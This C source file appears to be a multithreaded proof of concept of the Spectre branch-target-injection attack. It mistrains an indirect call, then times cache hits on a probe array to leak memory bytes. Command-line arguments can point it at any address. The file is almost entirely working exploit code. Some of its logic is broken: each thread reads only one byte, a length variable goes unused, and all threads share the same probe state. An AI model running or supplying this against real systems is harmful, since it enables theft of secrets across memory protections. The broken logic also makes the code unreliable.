#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pthread.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt", on)
#else
#include <x86intrin.h>
#endif

#define CACHE_HIT_THRESHOLD (80)
#define GAP (1024)
#define NUM_THREADS 4

uint8_t channel[256 * GAP];
uint64_t *target;
char *secret = "The Magic Words are Squeamish Ossifrage.";

int gadget(char *addr) {
  return channel[*addr * GAP];
}

int safe_target() {
  return 42;
}

int victim(char *addr, int input) {
  int junk = 0;
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }
  int result;
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  return result & junk;
}

void readByte(char *addr_to_read, char result[2], int score[2]) {
  int hits[256];
  int tries, i, j, k, mix_i, junk = 0;
  uint64_t start, elapsed;
  uint8_t *addr;
  char dummyChar = '$';

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = 999; tries > 0; tries--) {
    *target = (uint64_t)&gadget;
    _mm_mfence();
    for (j = 50; j > 0; j--) {
      junk ^= victim(&dummyChar, 0);
    }
    _mm_mfence();

    for (i = 0; i < 256; i++)
      _mm_clflush(&channel[i * GAP]);
    _mm_mfence();

    *target = (uint64_t)&safe_target;
    _mm_mfence();

    _mm_clflush((void*) target);
    _mm_mfence();

    junk ^= victim(addr_to_read, 0);
    _mm_mfence();

    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = __rdtsc();
      junk ^= *addr;
      _mm_mfence();
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || hits[i] >= hits[j]) {
        k = j;
        j = i;
      } else if (k < 0 || hits[i] >= hits[k]) {
        k = i;
      }
    }
    if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
      break;
    }
  }

  hits[0] ^= junk;
  result[0] = (char)j;
  score[0] = hits[j];
  result[1] = (char)k;
  score[1] = hits[k];
}

void *threadFunction(void *arg) {
  char *addr = (char *)arg;
  char result[2];
  int score[2];
  readByte(addr, result, score);
  printf("Thread reading %p: 0x%02X='%c'\n", addr, result[0], (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
  return NULL;
}

int main(int argc, char *argv[]) {
  target = (uint64_t*)malloc(sizeof(uint64_t));

  char *addr = secret;
  int len = strlen(secret);

  if (argc == 3) {
    sscanf(argv[1], "%p", (void **)(&addr));
    sscanf(argv[2], "%d", &len);
  }

  printf("Reading %d bytes starting at %p:\n", len, addr);

  pthread_t threads[NUM_THREADS];
  int chunk_size = len / NUM_THREADS;

  for (int i = 0; i < NUM_THREADS; i++) {
    char *thread_addr = addr + i * chunk_size;
    int thread_len = (i == NUM_THREADS - 1) ? len - i * chunk_size : chunk_size;
    pthread_create(&threads[i], NULL, threadFunction, thread_addr);
  }

  for (int i = 0; i < NUM_THREADS; i++) {
    pthread_join(threads[i], NULL);
  }

  free(target);
  return 0;
}
